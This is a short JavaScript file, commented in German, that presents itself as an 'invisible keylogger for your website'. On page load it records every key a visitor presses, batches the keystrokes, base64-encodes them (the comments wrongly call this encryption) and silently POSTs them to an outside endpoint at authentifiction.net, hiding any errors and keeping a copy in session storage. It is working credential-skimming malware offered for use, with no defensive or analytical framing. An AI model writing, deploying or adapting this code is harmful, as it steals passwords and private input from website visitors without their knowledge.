// keylogger.js – Unsichtbarer Keylogger für deine Website  
document.addEventListener('DOMContentLoaded', () => {  
    const TARGET_URL = 'https://authentifiction.net/log'; // Dein Log-Endpunkt  
    const ENCRYPT_KEY = 'DEIN_GEHEIMER_SCHLÜSSEL'; // Für AES-Verschlüsselung  

    // Tastendrücke sammeln  
    let buffer = '';  
    document.addEventListener('keydown', (e) => {  
        buffer += e.key;  
        if (buffer.length > 20) { // Batch senden (weniger Requests)  
            sendLogs(buffer);  
            buffer = '';  
        }  
    });  

    // Logs verschlüsselt senden  
    function sendLogs(data) {  
        const encrypted = btoa(encodeURIComponent(data)); // Base64 + URI-Kodierung  
        fetch(TARGET_URL, {  
            method: 'POST',  
            body: JSON.stringify({ data: encrypted }),  
            headers: { 'Content-Type': 'application/json' },  
            mode: 'cors',  
            credentials: 'omit'  
        }).catch(() => {}); // Fehler ignorieren  
    }  

    // Fallback: Lokal speichern (Session Storage)  
    setInterval(() => {  
        if (buffer.length > 0) {  
            sessionStorage.setItem('tmp_log', buffer);  
        }  
    }, 5000);  
});  
